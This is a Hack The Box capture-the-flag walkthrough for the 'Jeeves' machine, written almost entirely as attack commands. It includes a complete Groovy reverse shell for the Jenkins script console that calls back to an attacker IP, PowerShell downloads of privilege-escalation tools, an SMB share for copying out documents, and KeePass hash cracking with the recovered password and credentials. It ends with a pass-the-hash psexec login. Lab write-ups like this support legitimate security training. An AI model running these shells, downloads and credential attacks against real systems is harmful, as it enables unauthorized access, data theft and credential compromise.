# HTB: [Jeeves](https://www.hackthebox.com/machines/jeeves)  
# Walkthrough: [Video](https://youtu.be/qGhsmC3hZdM)
```bash
#############################################
# 1️⃣ Initial Enumeration
#############################################

# Open port 50000 → Jenkins
nmap -sC -sV -p50000 $IP

# Directory enumeration
ffuf -u http://$IP:50000/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 300

# Found: /askjeeves


#############################################
# 2️⃣ Jenkins RCE (Groovy Console)
#############################################

# Listener
nc -nvlp 4444

# Go to: Manage Jenkins → Script Console
# Execute Groovy reverse shell

Thread.start {
String host="10.10.14.33";
int port=4444;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
  while(pi.available()>0)so.write(pi.read());
  while(pe.available()>0)so.write(pe.read());
  while(si.available()>0)po.write(si.read());
  so.flush();po.flush();Thread.sleep(50);
  try {p.exitValue();break;} catch (Exception e){}
};
p.destroy();s.close();
}


#############################################
# 3️⃣ Looting with WinPEAS & PrintSpoofer
#############################################

powershell -c "Invoke-WebRequest -Uri http://10.10.14.33/winPEASx86.exe -OutFile C:\Users\Public\winPEASx86.exe"
powershell -c "Invoke-WebRequest -Uri http://10.10.14.33/PrintSpoofer32.exe -OutFile C:\Users\Public\pri.exe"

# SMB share for loot
mkdir -p /tmp/share
impacket-smbserver tmp /tmp/share -smb2support

# Exfil data
copy C:\Users\Documents\ \\10.10.14.33\tmp\


#############################################
# 4️⃣ KeePass Dump & Cracking
#############################################

# Convert KeePass DB to hash
keepass2john CEH.kdbx > hash.txt
# Remove CEH from hash header

# Crack with hashcat (KeePass AES)
hashcat -m 13400 -a 0 --username hash.txt /usr/share/wordlists/rockyou.txt -O
# Found password: moonshine1

# Load DB
kpcli --kdb CEH.kdbx
find .
show -f 0
show -f 5
show -f 6
show -f 7

# Alternatively
keepassxc-cli ls CEH.kdbx
keepassxc-cli show CEH.kdbx "Jenkins admin"

# Discovered credentials
UserName: admin
URL: http://localhost:8180/secret.jsp
URL: http://localhost:8080
Password: F7WhTrSFDKB6sxHU1cUn
Hash


#############################################
# 5️⃣ Lateral Movement with Psexec
#############################################

psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 administrator@10.129.228.112 cmd.exe
```
